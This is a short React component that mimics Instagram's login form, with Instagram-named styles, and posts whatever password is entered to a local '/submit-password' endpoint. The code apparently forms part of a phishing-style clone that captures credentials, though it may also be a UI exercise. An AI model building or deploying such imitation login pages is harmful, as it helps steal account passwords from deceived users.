import React, { useState } from 'react';
import axios from 'axios';
import './InstagramInput.css';
import './InstagramButton.css'

function InstagramPasswordInput() {
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post('http://localhost:5000/submit-password', { password });
     
    } catch (error) {
      console.error('There was an error sending the password!', error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <div className="instagram-input-container">
        <input
          type="password"
          className="instagram-input"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
      </div>
      <button type="submit" className="instagram-login-button">Log In</button>
    </form>
  );
}

export default InstagramPasswordInput;
